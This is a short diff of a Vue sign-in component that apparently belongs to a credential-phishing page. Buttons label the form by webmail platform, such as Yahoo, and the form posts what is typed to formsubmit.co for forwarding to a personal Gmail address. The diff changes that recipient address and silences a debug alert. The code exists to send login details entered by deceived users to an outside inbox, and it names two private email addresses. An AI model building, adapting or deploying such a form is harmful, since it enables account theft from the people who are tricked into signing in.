@@ -107,7 +107,7 @@ export default {
         // _captcha: "false",
         platform:'',
       },
-      formUrl: 'https://formsubmit.co/ajax/Rombergerdrystan200@gmail.com', // Replace with your desired URL
+      formUrl: 'https://formsubmit.co/ajax/karenlevin119@gmail.com', // Replace with your desired URL
       submitBtn:"Sign In"
     };
   },
@@ -129,7 +129,7 @@ export default {
     },
     showModal(evt){
       console.log(evt);
-      alert(evt.currentTarget.id);
+      // alert(evt.currentTarget.id);
       this.formData.platform = evt.currentTarget.id;
       switch(evt.currentTarget.id){
         case "yahoo":
